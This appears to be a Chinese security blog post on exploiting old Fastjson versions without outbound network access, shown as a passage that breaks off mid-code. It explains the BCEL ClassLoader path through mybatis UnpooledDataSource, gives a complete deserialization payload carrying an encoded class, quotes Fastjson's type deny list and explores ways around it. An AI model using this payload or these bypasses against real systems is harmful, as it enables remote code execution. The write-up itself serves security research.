<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>老版本Fastjson 的一些不出网利用 | 雨了个雨&#39;s blog</title>

  
  <meta name="author" content="雨了个雨">
  

  
  <meta name="description" content="Focus On Web Security">
  

  
  
  <meta name="keywords" content="Java">
  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  <meta property="og:title" content="老版本Fastjson 的一些不出网利用"/>

  <meta property="og:site_name" content="雨了个雨&#39;s blog"/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="雨了个雨&#39;s blog" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
<meta name="generator" content="Hexo 5.2.0"></head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/">雨了个雨&#39;s blog</a>
    </h1>
    <p class="site-description"></p>
  </div>
  <nav class="site-navigation">
    <ul>
      
        <li><a href="/">Home</a></li>
      
        <li><a href="/archives">Archives</a></li>
      
        <li><a href="/friends">Friends</a></li>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    <article>

  
    
    <h3 class="article-title"><span>老版本Fastjson 的一些不出网利用</span></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2022/11/12/Java安全攻防之老版本Fastjson-的一些不出网利用/" rel="bookmark">
        <time class="entry-date published" datetime="2022-11-12T07:13:24.000Z">
          2022-11-12
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>炒个冷饭，在近期的一些项目中，我们遇到了几个用了老版本Fastjson的目标，在利用时因为目标不出网的原因导致无法直接利用。<br>目前网上常见的老版本Fastjson不出网利用方式，主要有BCEL ClassLoader代码执行、C3P0二次反序列化、common-io写文件等利用方式，在我们的目标环境下均失败。<br>这次将BCEL ClassLoader的利用方式改成了题目出到了n1ctf中。</p>
<h2 id="1、FastJSON-BCEL-ClassLoader代码执行"><a href="#1、FastJSON-BCEL-ClassLoader代码执行" class="headerlink" title="1、FastJSON BCEL ClassLoader代码执行"></a>1、FastJSON BCEL ClassLoader代码执行</h2><p>做项目时遇到的一个案例，黑盒测试通过InetAddress探测目标FastJSON版本&lt;=1.2.48，同时探测到存在mybatis包，目标无DNS且不出网。</p>
<p>首先大概了解一下BCEL ClassLoader的利用原理，<br>com.sun.org.apache.bcel.internal.util.ClassLoader#loadClass</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Class <span class="title">loadClass</span><span class="params">(String class_name, <span class="keyword">boolean</span> resolve)</span></span></span><br><span class="line"><span class="function">  <span class="keyword">throws</span> ClassNotFoundException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Class cl = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First try: lookup hash table.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span>((cl=(Class)classes.get(class_name)) == <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="comment">/* Second try: Load system class using system class loader. You better</span></span><br><span class="line"><span class="comment">     * don&#x27;t mess around with them.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i &lt; ignored_packages.length; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span>(class_name.startsWith(ignored_packages[i])) &#123;</span><br><span class="line">        cl = deferTo.loadClass(class_name);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(cl == <span class="keyword">null</span>) &#123;</span><br><span class="line">      JavaClass clazz = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Third try: Special request?</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">if</span>(class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">        clazz = createClass(class_name);</span><br><span class="line">      <span class="keyword">else</span> &#123; <span class="comment">// Fourth try: Load classes via repository</span></span><br><span class="line">        <span class="keyword">if</span> ((clazz = repository.loadClass(class_name)) != <span class="keyword">null</span>) &#123;</span><br><span class="line">          clazz = modifyClass(clazz);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(class_name);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes  = clazz.getBytes();</span><br><span class="line">        cl = defineClass(class_name, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="comment">// Fourth try: Use default class loader</span></span><br><span class="line">        cl = Class.forName(class_name);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>BCEL ClassLoader在loadClass时，如果classname中含有$$BCEL$$，则会进入createClass逻辑中</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> JavaClass <span class="title">createClass</span><span class="params">(String class_name)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span>    index     = class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>);</span><br><span class="line">  String real_name = class_name.substring(index + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">  JavaClass clazz = <span class="keyword">null</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">byte</span>[]      bytes  = Utility.decode(real_name, <span class="keyword">true</span>);</span><br><span class="line">    ClassParser parser = <span class="keyword">new</span> ClassParser(<span class="keyword">new</span> ByteArrayInputStream(bytes), <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">    clazz = parser.parse();</span><br><span class="line">  &#125; <span class="keyword">catch</span>(Throwable e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>在createClass方法中，对classname解码得到class bytes，使用ClassParser解析class bytes生成JavaClass，最后调用defineClass生成class。</p>
<p>FastJSON 触发BCEL ClassLoader，目前使用得最多的两种利用方式需要分别依赖tomcat-dbcp、mybatis，通过FastJSON探测到目标存在mybatis包。</p>
<p>mybatis的BCEL利用类为 org.apache.ibatis.datasource.unpooled.UnpooledDataSource<br>众所众知，fastjson可以通过$ref、JSONObject调用getter方法，在该类的 getConnection -&gt; doGetConnection -&gt; initializeDriver</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">initializeDriver</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!registeredDrivers.containsKey(<span class="keyword">this</span>.driver)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class driverType;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.driverClassLoader != <span class="keyword">null</span>) &#123;</span><br><span class="line">                driverType = Class.forName(<span class="keyword">this</span>.driver, <span class="keyword">true</span>, <span class="keyword">this</span>.driverClassLoader);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                driverType = Resources.classForName(<span class="keyword">this</span>.driver);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Driver driverInstance = (Driver)driverType.getDeclaredConstructor().newInstance();</span><br><span class="line">            DriverManager.registerDriver(<span class="keyword">new</span> DriverProxy(driverInstance));</span><br><span class="line">            registeredDrivers.put(<span class="keyword">this</span>.driver, driverInstance);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SQLException(<span class="string">&quot;Error setting driver on UnpooledDataSource. Cause: &quot;</span> + var3);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在initializeDriver方法中，如果设置了driverClassLoader属性，就会进入Class.forName逻辑，通过FastJSON的反序列化可以控制driver、driverClassLoader属性，也就是我们能控制classloader和classname。<br>同时在Class.forName时，设置了initialize属性为true，会触发静态方法，这时候控制classloader为BCEL ClassLoader，再控制classname为$$BCEL$$XXX，即可实现代码执行，在initializeDriver方法里也newInstance了所以也会触发构造方法。</p>
<p>根据网上公开的&lt;=1.2.24的BCEL ClassLoader修改的payload如下，在1.2.47可触发</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;x&quot;:&#123;&quot;xxx&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;&#125;,&quot;c&quot;:&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;&#125;,&quot;www&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;,&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,&quot;c&quot;:&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;&#125;,&quot;c&quot;:&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;,&quot;driverClassLoader&quot;:&#123;&quot;@type&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;,&quot;driver&quot;:&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbN$hA$Q$ac$b1$8d$f7$c1$9a$87$c1$e6$91$84$98$b7$8d$E$3e$e4h$94K$ER$94M$88bd$94$e3x$Y$cc$c0$b2$b3Z$8f$81$3f$e2$cc$85D$89$94$dc$f3Q$88$9e$F$ZKd$P$dd$d3U$d5$d5$3d$b3$ff$ee$7f$fd$B$f0$Ou$l$k$e6$7d$y$60$d1$c5$x$9b_$3bx$e3$60$c9G$Ro$j$d4$i$y3$UwU$ac$cc$7b$86$7c$bd$d1a$u$7c$d0$c7$92a2T$b1$fc2$b8$e8$ca$f4$90w$pB$ca$a1$W$3c$ea$f0T$d9$fa$J$y$98S$d5$t$8fp$efRE$z$GwWDOv$8c$e8Jx$c6$_yS$e9$e6$c7$83$bdk$n$T$a3tL$b2R$dbpq$fe$99$t$99$N$z$c5$e0$b7$f5$m$Vr_Y$5b$cf$da$ed$d8$de$A$3e$c6$j$ac$EX$c5$gCU$t2$aem$f3$g$ad$o$G$R7$3a$dd$e1I$S$60$j$h$M3$ff$99$c6$b0$98$a1$R$8f$7b$cdo$83$d8$a8$L9$q$ad$fb$s$dd$c2$8ec$98z$W$kt$cf$a40$M$d3$_zi$d3$9e4$c3$a2Ro$84$_4t$c3$82$bc$96$82a$b3$3e$c2$b6M$aa$e2$5ek$b4$e1k$aa$85$ec$f7$a9a$7eTyx$9a$ea$x$fb4$adF$H$cbp$e9$3f$da$_$Hf$9f$83b$40U$932$a3$3c$b6$f5$D$ec6$a3K$U$8b$Z$98$c7$E$c5$e0Q$80ILQv1$3dl$3e$n$85$e5$e6$7e$oW$ce$df$a1pt$83$d2$a7$df$u$7e$t7$e7$efmFz$q$j$p$a1$b5$ad$d2$Jp$I$f3$Ju$J$f3$I$h$l$8e$b1u$Z3T$cdf$ba$5c$e8$a0$e2$RQ$cd6$9b$7b$A$7f$Q$bb$L$96$C$A$A&quot;&#125;&#125;:&#123;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>但是在目标环境下却没成功利用，不过很容易想到没利用成功的原因。在之前的&lt;&lt;那些年一起打过的CTF - Laravel 任意用户登陆Tricks分析&gt;&gt;文章中也提到过，该利用只有在fastjson 1.2.33 - 1.2.47或者无autotype的版本可利用，那么大概率就是因为目标版本处于1.2.25 - 1.2.32版本之间。</p>
<p>在fastjson 25 - 32，checkAutoType方法中，只要反序列化的类在黑名单中就抛出异常。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.denyList.length; ++i) &#123;</span><br><span class="line">    deny = <span class="keyword">this</span>.denyList[i];</span><br><span class="line">    <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">在fastjson &gt;= <span class="number">33</span>时，就算反序列的类在黑名单中，只要反序列的类在mapping中就不会抛出异常，所以通过java.lang.Class将恶意类加入到mapping后能够利用</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.denyList.length; ++i) &#123;</span><br><span class="line">    deny = <span class="keyword">this</span>.denyList[i];</span><br><span class="line">    <span class="keyword">if</span> (className.startsWith(deny) &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>1.2.31版本的黑名单为，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework</span><br></pre></td></tr></table></figure>

<p>com.sun包在黑名单中，导致com.sun.org.apache.bcel.internal.util.ClassLoader无法使用。</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2022/11/12/16682375553518.jpg"></p>
<p>那么是否能够绕过这个限制?<br>回到1.2.31的checkAutoType方法中，黑名单的检测是通过startsWith方法进行检测</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">    <span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        String className = typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> i;</span><br><span class="line">            String deny;</span><br><span class="line">            <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.acceptList.length; ++i) &#123;</span><br><span class="line">                deny = <span class="keyword">this</span>.acceptList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.denyList.length; ++i) &#123;</span><br><span class="line">                deny = <span class="keyword">this</span>.denyList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = <span class="keyword">this</span>.deserializers.findClass(typeName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">this</span>.autoTypeSupport) &#123;</span><br><span class="line">                String accept;</span><br><span class="line">                <span class="keyword">int</span> i;</span><br><span class="line">                <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.denyList.length; ++i) &#123;</span><br><span class="line">                    accept = <span class="keyword">this</span>.denyList[i];</span><br><span class="line">                    <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.acceptList.length; ++i) &#123;</span><br><span class="line">                    accept = <span class="keyword">this</span>.acceptList[i];</span><br><span class="line">                    <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                        clazz = TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader);</span><br><span class="line">                        <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">return</span> clazz;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">                clazz = TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> clazz;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">this</span>.autoTypeSupport) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>&lt;=1.2.48的利用中，是通过java.lang.Class将恶意类加入到mapping中，在checkAutoType方法中，通过三个方法来尝试获取了class，这里主要关注其中两个从mapping获取clazz的方法，在autotype默认关闭的场景下，可以简单理解为</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">        如果exceptclass不为空，进行黑白名单检测</span><br><span class="line">        </span><br><span class="line">        Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = <span class="keyword">this</span>.deserializers.findClass(typeName);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(clazz != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        必定进行黑白名单检测</span><br><span class="line">        </span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader); </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">根据之前的经验，能够知道TypeUtils.loadClass获取clazz时，存在一些黑名单绕过的方式。</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">    <span class="keyword">if</span> (className != <span class="keyword">null</span> &amp;&amp; className.length() != <span class="number">0</span>) &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = (Class)mappings.get(className);</span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">            Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">            <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">            String newClassName = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (classLoader != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    clazz = classLoader.loadClass(className);</span><br><span class="line">                    mappings.put(className, clazz);</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var6) &#123;</span><br><span class="line">                var6.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();</span><br><span class="line">                <span 